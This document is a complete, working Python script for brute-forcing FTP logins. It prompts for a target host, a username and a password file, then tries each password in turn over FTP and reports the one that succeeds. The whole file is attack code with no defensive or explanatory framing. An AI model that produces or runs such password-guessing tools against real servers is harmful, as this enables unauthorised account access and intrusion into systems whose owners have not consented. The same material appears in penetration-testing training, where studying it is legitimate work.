# Imports
import ftplib, sys, os, socket

# Variables
global host, username, line, input_file

line = "\n------------------------------------------------------\n"

#Functions
def ftp_connect(password, code = 0):
	server = ftplib.FTP()

	try:
		server.connect(host, port=21, timeout=5)
		server.login(username, password)
	except ftplib.error_perm:
		#[*] Authentication Failed ...
		code = 1
	except socket.error as e:
		#[*] Connection Failed ... Host Down
		code = 2

	#FTP.close() #error with this command
	return code

# User Inputs
try:
	host = input("[*] Enter Target Host Address: ")
	username = input("[*] Enter FTP Username: ")
	input_file = input("[*] Enter FTP Password File: ")

	if os.path.exists(input_file) == False:
		print("\n[*] File Path Does Not Exist")
		sys.exit(4)
except KeyboardInterrupt:
	print("\n\n[*] User Requested An Interupt")
	sys.exit(3)


# Main
input_file = open(input_file)

print("")

for i in input_file.readlines():
	password = i.strip("\n")
	try:
		response = ftp_connect(password)

		if response == 0:
			print("%s[*] User: %s [*] Password Found: %s%s" % (line, username, password, line))
			sys.exit(0)
		elif response == 1:
			print("[*] User: %s [*] Password: %s => Login Incorrect <=" % (username, password))
		elif response == 2:
			print("[*] Connection Could Not Be Established To Address: %s" % (host))
			sys.exit(2)
	except Exception as e:
		print(e)
		pass

input_file.close()